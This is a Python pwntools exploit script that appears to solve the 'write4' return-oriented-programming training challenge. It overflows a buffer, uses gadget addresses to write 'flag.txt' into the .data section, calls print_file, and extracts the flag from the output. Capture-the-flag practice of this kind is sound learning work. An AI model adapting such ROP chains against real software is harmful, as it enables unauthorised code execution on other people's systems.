from pwn import *

gad_write_pop = p64(0x400690)
gad_write = p64(0x400628)
data_addr=p64(0x601028)


gad_print_file_pop = p64(0x400693)
gad_print_file = p64(0x400510)

pay = b'X'*40

# write string 'flag.txt' to .data section
pay += gad_write_pop
pay += data_addr + b'flag.txt'
pay += gad_write

pay += gad_print_file_pop + data_addr
pay += gad_print_file

#  sys.stdout.buffer.write(pay)

elf = ELF('write4')
p = process(elf.path)
p.sendline(pay)
response = p.recvall()

print(response.decode())

flag = re.findall("ROPE{.*?}", response.decode())

if flag:
    #  print(flag[0])
    print("[-] Get flag!")
    success(flag[0])



